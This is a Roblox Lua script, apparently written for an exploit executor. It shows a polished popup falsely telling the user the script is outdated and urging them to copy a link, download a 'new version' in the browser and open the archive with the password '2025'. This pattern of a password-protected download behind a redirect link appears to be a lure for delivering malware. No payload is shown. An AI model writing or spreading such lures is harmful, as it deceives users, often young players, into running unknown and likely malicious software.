
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local CopyButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local ButtonCorner = Instance.new("UICorner")
local Gradient = Instance.new("UIGradient")
local ButtonShadow = Instance.new("ImageLabel")
local Sound = Instance.new("Sound")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 0, 0, 0) 
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.Active = true
Frame.Draggable = true 

UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

Gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0.0, Color3.fromRGB(25, 25, 25)),
	ColorSequenceKeypoint.new(1.0, Color3.fromRGB(10, 10, 10))
}
Gradient.Rotation = 45
Gradient.Parent = Frame

TweenService:Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	Size = UDim2.new(0, 500, 0, 270)
}):Play()

TextLabel.Parent = Frame
TextLabel.Text = "This script is outdated,\ndownload the new version of the script,\nclick on the Copy Link button, and you will get a copy of the link\nand need to paste it into your browser and download the new version\nPassword to unlock the archive: 2025"
TextLabel.Size = UDim2.new(1, -40, 0.7, 0)
TextLabel.Position = UDim2.new(0, 20, 0, 20)
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextWrapped = true
TextLabel.TextScaled = true
TextLabel.Font = Enum.Font.GothamMedium

ButtonShadow.Name = "ButtonShadow"
ButtonShadow.Parent = Frame
ButtonShadow.BackgroundTransparency = 1
ButtonShadow.Position = UDim2.new(0.3, -5, 0.8, 5)
ButtonShadow.Size = UDim2.new(0.4, 10, 0.15, 10)
ButtonShadow.Image = "rbxassetid://1316045217"
ButtonShadow.ImageTransparency = 0.5
ButtonShadow.ScaleType = Enum.ScaleType.Slice
ButtonShadow.SliceCenter = Rect.new(10, 10, 118, 118)

CopyButton.Parent = Frame
CopyButton.Text = "Copy Link"
CopyButton.Size = UDim2.new(0.4, 0, 0.15, 0)
CopyButton.Position = UDim2.new(0.3, 0, 0.8, 0)
CopyButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Font = Enum.Font.GothamBold
CopyButton.TextScaled = true

ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = CopyButton

Sound.SoundId = "rbxassetid://12222030"
Sound.Volume = 0.5
Sound.Parent = CopyButton

CopyButton.MouseButton1Click:Connect(function()
    setclipboard("http://youtube.com/post/UgkxMbaKBu1n_HtU_oc2AQzFqJv9NFLumlua?si=llu1UyW6ATMjgvHH")
    CopyButton.Text = "Copied!"
    Sound:Play()
    wait(2)
    CopyButton.Text = "Copy Link"
end)

local hoverIn = TweenService:Create(CopyButton, TweenInfo.new(0.2), {
	BackgroundColor3 = Color3.fromRGB(65, 65, 65),
	Size = UDim2.new(0.42, 0, 0.17, 0),
	Position = UDim2.new(0.29, 0, 0.795, 0)
})

local hoverOut = TweenService:Create(CopyButton, TweenInfo.new(0.2), {
	BackgroundColor3 = Color3.fromRGB(45, 45, 45),
	Size = UDim2.new(0.4, 0, 0.15, 0),
	Position = UDim2.new(0.3, 0, 0.8, 0)
})

CopyButton.MouseEnter:Connect(function()
	hoverIn:Play()
end)

CopyButton.MouseLeave:Connect(function()
	hoverOut:Play()
end)
